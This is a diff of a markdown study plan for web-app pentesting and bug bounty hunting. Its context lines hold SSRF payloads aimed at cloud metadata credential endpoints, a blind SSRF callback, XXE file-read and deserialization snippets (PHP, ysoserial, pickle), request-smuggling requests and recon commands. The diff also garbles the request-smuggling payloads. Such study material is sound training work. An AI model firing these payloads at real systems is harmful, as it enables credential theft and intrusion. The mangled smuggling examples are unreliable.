@@ -903,7 +903,6 @@ Study Time: 4-5 hours
 Morning: Server-Side Request Forgery (2 hours)
 Basic SSRF
 
-text
 
 # Internal service access
 
@@ -920,7 +919,6 @@ http://0x7f000001/admin  (hex IP)
 
 Blind SSRF
 
-text
 
 # Use Burp Collaborator or interactsh
 
@@ -934,13 +932,11 @@ curl [https://oast.live/burpcollaborator](https://oast.live/burpcollaborator)  \
 
 Cloud Metadata Exploitation
 
-text
 
 # AWS
 
 [http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name](http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name)
 
-# Azure
 
 [http://169.254.169.254/metadata/instance?api-version=2021-02-01](http://169.254.169.254/metadata/instance?api-version=2021-02-01)
 Header: Metadata: true
@@ -953,7 +949,6 @@ Header: Metadata-Flavor: Google
 Afternoon: XXE \& Deserialization (3 hours)
 XML External Entity (XXE)
 
-text
 
 <!-- Basic file read -->
 <?xml version="1.0"?>
@@ -981,7 +976,6 @@ Deserialization Attacks
 
 PHP Object Injection:
 
-text
 // Vulnerable code
 
 <?php
@@ -998,7 +992,6 @@ O:4:"User":1:{s:4:"name";s:10:"/tmp/pwned";}
 
 Java Deserialization:
 
-text
 # ysoserial tool
 java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64
 
@@ -1006,7 +999,6 @@ java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64
 
 Python Pickle:
 
-text
 import pickle
 import os
 
@@ -1047,26 +1039,19 @@ Study Time: 4-5 hours
 Morning: HTTP Request Smuggling & Cache Poisoning (2 hours)
 CL.TE Request Smuggling
 
-text
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 6
 Transfer-Encoding: chunked
 
-0
+Request Smuggling
 
-G
-
-TE.CL Request Smuggling
-
-text
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 4
 Transfer-Encoding: chunked
 
-5c
-GPOST / HTTP/1.1
+POST / HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
@@ -1117,7 +1102,6 @@ Bug Bounty Methodology
 
 Step 1: Asset Discovery (1 hour)
 
-text
 # Comprehensive subdomain enum
 subfinder -d target.com | httpx | nuclei -t ~/nuclei-templates/
 
@@ -1129,7 +1113,6 @@ Step 2: Focused Testing (2 hours)
 
 Step 3: Low-Hanging Fruit (30 min)
 
-text
 # Quick wins
 nuclei -u [https://target.com](https://target.com) -t exposures/,cves/
 
@@ -1216,7 +1199,6 @@ echo "[+] Recon complete!"
 
 Python Custom Exploit
 
-text
 import requests
 import concurrent.futures
 
@@ -1313,7 +1295,6 @@ Platforms
 
 Portfolio Building
 
-text
 # Create GitHub repo for notes
 git init web-app-pentest-notes
 cd web-app-pentest-notes
@@ -1342,8 +1323,8 @@ Today's Checklist
 
 ---
 
-Continuous Learning Path
-##Week 2-4: Specialization
+## Continuous Learning Path
+## Week 2-4: Specialization
 
     Choose: Bug Bounty OR Enterprise Pentesting OR Red Team
 
